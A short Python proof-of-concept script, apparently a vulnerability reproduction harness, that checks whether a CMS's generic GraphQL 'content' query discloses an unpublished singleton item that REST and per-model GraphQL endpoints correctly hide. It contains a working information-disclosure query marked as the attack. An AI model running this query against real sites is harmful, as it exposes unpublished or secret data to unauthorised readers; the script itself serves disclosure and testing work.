#!/usr/bin/env python3
"""CK-003 harness: unpublished singleton leaked by generic GraphQL content query.
Prereqs: fixtures + singleton model 'siteconfig' whose only item is
UNPUBLISHED (_state=0) with apikey_note='SINGLETON-SECRET'; reader key's role
has content/siteconfig/read (read permission is granted - publication state
is what must still be enforced).
Controls: REST item endpoint -> 404; per-model GraphQL query -> null.
Attack: generic GraphQL { content(model:"siteconfig") } -> full item.
"""
import sys, json
sys.path.insert(0, '../../live-repro')
from ck import *

RK = 'reader-key-12345'

def gql(query, key):
    return api('POST', '/gql', key=key, json={'query': query, 'variables': {}})

r = api('GET', '/content/item/siteconfig', key=RK)
print(f'CONTROL REST singleton: HTTP {r.status_code} body={r.text[:60]!r} (expected 404/empty)')
c1 = r.status_code == 404 or 'SINGLETON-SECRET' not in r.text

r = gql('{ siteconfigModel { apikey_note _state } }', RK)
print(f'CONTROL GraphQL per-model singleton: HTTP {r.status_code} {r.text[:120]} (expected null)')
c2 = 'SINGLETON-SECRET' not in r.text

r = gql('{ content(model: "siteconfig") }', RK)
print(f'ATTACK GraphQL generic content: HTTP {r.status_code} {r.text[:220]}')
a = 'SINGLETON-SECRET' in r.text

print('VERDICT:', 'VULNERABLE - unpublished singleton disclosed via generic GraphQL query' if (c1 and c2 and a) else 'NOT REPRODUCED')
sys.exit(0 if (c1 and c2 and a) else 1)
